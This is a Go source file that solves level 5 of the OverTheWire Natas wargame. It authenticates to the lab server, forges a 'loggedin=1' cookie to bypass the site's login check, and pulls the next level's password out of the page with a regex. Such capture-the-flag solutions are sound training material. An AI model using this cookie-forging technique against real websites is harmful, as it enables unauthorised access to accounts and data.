package levels

import (
	"io"
	"log"
	"net/http"
	"regexp"
)

func GetLevel6Password(password string) string {
	var username string = "natas5"
	client := &http.Client{}

	req, err := http.NewRequest("GET", "http://natas5.natas.labs.overthewire.org", nil)
	if err != nil {
		log.Fatal(err)
	}

	req.SetBasicAuth(username, password)

	cookie := &http.Cookie{
		Name:  "loggedin",
		Value: "1",
	}
	req.AddCookie(cookie)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	bodyText, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Fatal(err)
	}

	s := string(bodyText)

	re := regexp.MustCompile(`The password for natas6 is (.*)<`)
	match := re.FindStringSubmatch(s)
	natas5Password := match[1]

	return natas5Password
}
